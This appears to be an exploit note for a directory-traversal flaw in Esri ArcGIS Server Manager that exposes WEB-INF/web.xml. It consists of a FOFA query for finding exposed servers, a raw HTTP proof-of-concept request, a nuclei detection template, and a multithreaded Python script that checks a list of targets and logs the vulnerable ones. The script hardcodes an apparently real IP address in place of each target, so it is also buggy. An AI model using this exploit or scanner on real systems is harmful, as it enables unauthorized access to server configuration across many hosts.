# fofa

```plain
app="esri-ArcGIS"
```

# poc

```http
GET /arcgis/manager/3370/js/../WEB-INF/web.xml HTTP/1.0
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.127 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
```

# nuclei

```yaml
id: test

info:
  name: test
  author: zxf
  severity: high

http:
  - raw:
      - |
        GET /arcgis/manager/3370/js/../WEB-INF/web.xml HTTP/1.0
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.127 Safari/537.36
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
        Accept-Encoding: gzip, deflate
        Accept-Language: zh-CN,zh;q=0.9
        Connection: close
        
    matchers:
      - type: dsl
        dsl:
          - status_code==200 && contains_all(body,"Server Manager")
```

# exp

```python
import requests
import concurrent.futures

proxy = {
    'https':'http://127.0.0.1:8081'
}


def check_vulnerability(target):
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.127 Safari/537.36",
        "Accept-Encoding": "gzip, deflate",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
        "Accept-Language": "zh-CN,zh;q=0.9",
    }

    try:
        # print(target)
        url1="/arcgis/manager/3370/js/../WEB-INF/web.xml"
        print(url1)
       # res = requests.get(f"{target}/arcgis/manager/3370/js/../WEB-INF/web.xml", headers=headers, timeout=5,proxies=proxy)
        res = requests.get(f"https://182.92.6.215:6443/"+url1,headers=headers, timeout=5,verify=False,proxies=proxy)
        if "Server Manager" in res.text:
            print(f"[+]{target}漏洞存在")
            with open("attack.txt", 'a') as fw:
                fw.write(f"{target}\n")
        else:
            print(f"[-]{target}漏洞不存在")
    except Exception as e:
        print(f"[-]{target}访问错误")


if __name__ == "__main__":
    print("------------------------")
    print("target.txt存放目标文件")
    print("attack.txt存放检测结果")
    print("------------------------")

    print("按回车继续")
    import os

    #os.system("pause")
    f = open("target.txt", 'r')
    targets = f.read().splitlines()
    # print(targets)

    # 使用线程池并发执行检查漏洞
    with concurrent.futures.ThreadPoolExecutor(max_workers=1) as executor:
        executor.map(check_vulnerability, targets)
```

![img](https://cdn.nlark.com/yuque/0/2025/png/40959960/1737448209481-e6fd54a8-a8cc-4efe-9bf8-e6b31d0b771f.png)